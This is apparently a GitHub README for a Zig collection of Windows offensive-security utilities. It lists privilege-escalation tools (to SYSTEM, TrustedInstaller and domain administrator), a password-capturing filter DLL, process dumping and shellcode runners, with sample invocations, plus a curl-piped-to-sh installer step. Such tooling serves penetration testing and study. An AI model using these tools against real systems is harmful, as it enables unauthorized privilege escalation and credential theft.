# A small set of utilities ported to Ziglang (for fun and no profit)

## Contents

### [AddUser](AddUser_windows_shared.zig)

An example of adding a user with a DLL (sideload it).

### [BackupOperatorToDomainAdministrator](BackupOperatorToDomainAdministrator_windows.zig)

As the name implies - with the right group / privileges - "there be dragons".

```powershell
# Dump workgroup box
.\BackupOperatorToDomainAdministrator.exe HOSTNAME/user:password@HOSTNAME \\HOSTNAME\share\

# Dump domain box
.\BackupOperatorToDomainAdministrator.exe DOMAIN/user:password@ip \\HOSTNAME\share\
```

### [HighToSystem](HighToSystem_windows.zig)

Provided a process in a 'high' context - leverage that to obtain `SYSTEM`.

```
.\HighToSystem.exe <pid> <fullpath to an executable>
```

Reference: https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962


### [HighToTrustedInstaller](HighToTrustedInstaller_windows.zig)

Provided a process in a 'high' context - leverage that to obtain `TrustedInstaller`.

```
Start-Service -Name TrustedInstaller
.\HighToTrustedInstaller.exe <pid> <TI pid> <fullpath to an executable>
```

### [Minidump](Minidump_windows.zig)

Call minidump on a PID.

### [ModifyPrivilege](ModifyPrivilege_windows.zig)

Modify a processes privileges (enable/disable/remove)

```powershell
# Enable all privileges to the current terminal
.\ModifyPrivilege.exe 0

# Enable all privilges on this PID
.\ModifyPrivilege.exe <some pid>
```

### [NTRights](NTRights_windows.zig)

An open source alternative to ntrights.exe to allow manipulation of LSA policy on windows.

### [PasswordFilter](PasswordFilter_windows_shared.zig)

An example password filter (DLL) with [catcher](PasswordFilter_net.py) (if desired)

### [RelabelAbuse](RelabelAbuse_windows.zig)

An example usage for the SeRelabel privilege.

### [SessionExec](SessionExec_windows.zig)

Execute code in other sessions (spawns powershell).

### Shellcode

With a msfvenom payload; example of shellcode execution on both [Windows](shellcode_windows.zig) and [Linux](shellcode_linux.zig).

### [Shortcut](Shortcut_windows.zig)

Provided a quick utility to create shortcuts from the command line.

```
 .\Shortcut.exe  C:\windows\system32\cmd.exe C:\users\username\desktop\cmd.lnk C:\
```

## Get and Build

```bash
git clone git@github.com:ArchiMoebius/zig-win32-utilities.git --recurse-submodules

# - OR -

git clone https://github.com/ArchiMoebius/zig-win32-utilities.git --recurse-submodules
```

### Setup Zig

#### WebInstall

Visit [webinstall](https://webinstall.dev/zig/) or just

```bash
curl -sS https://webi.sh/zig | sh
source ~/.config/envman/PATH.env
```

The above Creates `~/.local/opt/zig`

#### Download Ziglang

Visit [Zig](https://ziglang.org/download/) and download / extract the most recent tagged version.


### Build

Creates those `*.exe` files.

```bash
make
tree zig-out
```

### Development

Creates those `*.exe` and `*.pdb` files.

```bash
make debug
tree zig-out
```
